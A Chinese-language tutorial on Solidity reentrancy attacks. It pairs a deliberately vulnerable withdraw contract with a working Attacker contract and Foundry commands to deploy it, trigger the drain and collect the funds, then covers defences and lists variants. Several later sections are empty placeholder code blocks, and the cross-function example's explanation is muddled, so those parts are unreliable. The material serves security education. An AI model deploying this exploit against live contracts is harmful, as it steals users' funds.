# 重入攻击 (Reentrancy)

## 原理

合约在调用外部合约时，外部合约通过回调函数重新进入原合约，利用状态未更新的窗口重复执行提款等操作。

## 经典漏洞

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vulnerable {
    mapping(address => uint) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        
        // 漏洞：先转账再更新余额
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;  // 状态更新在转账之后
    }
}
```

## 攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerable public target;
    
    constructor(address _target) public {
        target = IVulnerable(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    // 接收以太坊时触发重入
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
    
    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

## 攻击链

### 1. 部署攻击合约

```bash
# 使用 Foundry
forge create Attacker --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $TARGET_ADDRESS
```

### 2. 发起攻击

```bash
cast send $ATTACKER_ADDRESS "attack()" --value 1ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 3. 收集资金

```bash
cast send $ATTACKER_ADDRESS "collect()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

## 防护方法

### 1. Checks-Effects-Interactions 模式

```solidity
function withdraw() external {
    // 1. Checks
    uint amount = balances[msg.sender];
    require(amount > 0, "Insufficient balance");
    
    // 2. Effects
    balances[msg.sender] = 0;
    
    // 3. Interactions
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

### 2. ReentrancyGuard

```solidity
// OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Safe is ReentrancyGuard {
    function withdraw() external nonReentrant {
        // ...
    }
}
```

### 3. 使用 transfer/transfer

```solidity
// transfer 限制 2300 gas，无法重入
msg.sender.transfer(amount);

// 但不推荐，因为 gas 限制可能不够
```

## 重入变种

### 1. 跨函数重入

```solidity
// 函数 A 调用外部合约
// 外部合约回调函数 B
// 函数 B 也修改状态

function withdraw() external {
    uint amount = balances[msg.sender];
    (bool success, ) = msg.sender.call{value: amount}("");
    balances[msg.sender] = 0;
}

function deposit() external payable {
    balances[msg.sender] += msg.value;
}

// 攻击者在 withdraw 的 call 回调中调用 deposit
// 导致 balances 被重复增加
```

### 2. 跨合约重入

```solidity
// 合约 A 调用合约 B
// 合约 B 调用外部合约
// 外部合约回调合约 A 的其他函数
```

### 3. 只读重入

```solidity
// 攻击者在 view 函数中重入
// 影响 view 函数的返回值
// 用于操纵价格预言机
```

### 4. ERC-777 重入

```solidity
// ERC-777 的 tokensReceived 回调
// 类似 receive，但更强大
// 可触发重入
```

### 5. ERC-721/ERC-1155 重入

```solidity
// onERC721Received
// onERC1155Received
// 回调函数可触发重入
```

## 2024-2026 新技术点

### 1. 跨链桥重入

```solidity
// 跨链桥的验证逻辑
// 可能在验证过程中重入
```

### 2. NFT 重入

```solidity
// ERC-721 的 safeTransferFrom
// 触发 onERC721Received
// 可重入
```

### 3. 闪电贷重入

```solidity
// 闪电贷 + 重入
// 放大攻击效果
```

### 4. MEV 重入

```solidity
// MEV 机器人 + 重入
// 新的攻击模式
```

### 5. Layer 2 重入

```solidity
// Optimistic Rollup
// ZK Rollup
// 新的重入场景
```

### 6. 账户抽象重入

```solidity
// ERC-4337
// 新的重入场景
```

### 7. Vyper 重入

```solidity
// Vyper 编译器漏洞
// 导致重入
```

### 8. 零知识证明重入

```solidity
// zk-SNARK 验证
// 新的重入场景
```

### 9. DAO 治理重入

```solidity
// 治理投票
// 提案执行
// 新的重入场景
```

### 10. AI 辅助检测

```python
# ML 辅助
# 自动检测重入
# 模式识别
```

## 工具推荐

- **Foundry** — 合约开发/测试
- **Slither** — 静态分析
- **Mythril** — 符号执行
- **Echidna** — 模糊测试
- **OpenZeppelin** — 安全库

## 参考链接

- [Smart Contract Attacks](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [The DAO Hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)
- [Reentrancy Attack](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
